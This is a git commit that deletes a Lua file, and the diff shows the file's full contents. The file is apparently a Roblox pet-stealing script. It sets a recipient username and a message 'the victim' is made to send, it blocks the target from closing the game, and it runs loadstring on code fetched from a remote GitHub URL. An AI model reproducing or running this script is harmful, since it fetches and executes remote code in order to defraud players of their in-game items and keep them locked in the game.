870f40a7c03752cda3b4dea6cedb4f7450c5e778
SCRIPTINGCOMMUNITY <137361755+SCRIPTINGCOMMUNITY@users.noreply.github.com>
2023-06-23 18:51:52 +0500

    Delete 4GfOOm_1687459642.lua

--- 4GfOOm_1687459642.lua
+++
@@ -1,9 +0,0 @@
-
--- Script Key: 4GfOOm_1687459642
-_G.Username = "!generate" --// Username To Send Pets To
-_G.GiftMessage = "HEHEH" --// Message For The Gift To Say
-_G.SendMessage = "bebebe" --// Message the victim will send in the chat on execution
-_G.Diamonds = 1000000 --// Amount Of Diamonds To detect alt set an amount of diamond that if the target is under this number, the script will show them an error
-_G.UnlockPets = true --// Unlocks Locked Pets
-_G.AntiLeave = true --// Doesn't Let The Target Close Roblox
-loadstring(game:HttpGet("https://raw.githubusercontent.com/SCRIPTINGCOMMUNITY/SCRIPTS/4GfOOm_1687459642.lua"))()
